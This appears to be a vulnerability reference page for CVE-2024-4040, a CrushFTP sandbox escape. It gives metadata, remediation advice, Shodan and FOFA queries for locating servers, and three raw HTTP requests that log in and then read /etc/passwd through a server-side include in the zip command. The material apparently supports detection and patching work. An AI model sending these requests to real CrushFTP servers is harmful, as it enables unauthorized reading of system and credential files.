---
layout: post
cve_id: CVE-2024-4040
title: CrushFTP VFS - Sandbox Escape LFR
pcap: true
pcap_path: /pcaps/2024/CVE-2024-4040.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-4040.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDK,pussycat0x
severity: critical
impact: 'Successful exploitation could lead to unauthorized access to sensitive data.

  '
remediation: 'Apply the vendor-supplied patch or upgrade to the latest version to
  mitigate CVE-2024-4040.

  '
reference:
- https://www.bleepingcomputer.com/news/security/crushftp-warns-users-to-patch-exploited-zero-day-immediately/
- https://www.crushftp.com/crush10wiki/Wiki.jsp?page=Update
- https://www.reddit.com/r/crowdstrike/comments/1c88788/situational_awareness_20240419_crushftp_virtual/
- https://www.reddit.com/r/cybersecurity/comments/1c850i2/all_versions_of_crush_ftp_are_vulnerable/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
  cvss-score: 10
  cve-id: CVE-2024-4040
  cwe-id: CWE-94,CWE-1336
  epss-score: 0.94426
  epss-percentile: 0.99981
  cpe: cpe:2.3:a:crushftp:crushftp:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 5
  vendor: crushftp
  product: crushftp
  shodan-query:
  - html:"CrushFTP"
  - http.html:"crushftp"
  fofa-query: body="crushftp"
tags:
- cve
- cve2024
- lfr
- crushftp
- vfs
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
VFS Sandbox Escape in CrushFTP in all versions before 10.7.1 and 11.1.0 on all platforms allows remote attackers with low privileges to read files from the filesystem outside of VFS Sandbox.


## üåê HTTP Request
```nohighlight
GET /WebInterface/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.2 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /WebInterface/function/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Connection: close
Content-Length: 97
Origin: /
Referer: http:////WebInterface/login.html
Accept-Encoding: gzip

command=login&username=LeRf2c&password=IR9fpy&encoded=true&language=en&random=0.34712915617878926
```

```nohighlight
POST /WebInterface/function/?command=zip&c2f=3yC7Ci&path=<INCLUDE>/etc/passwd</INCLUDE>&names=/bbb HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14092.77.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.107 Safari/537.36
Connection: close
Transfer-Encoding: chunked
Accept-Encoding: gzip

0
```

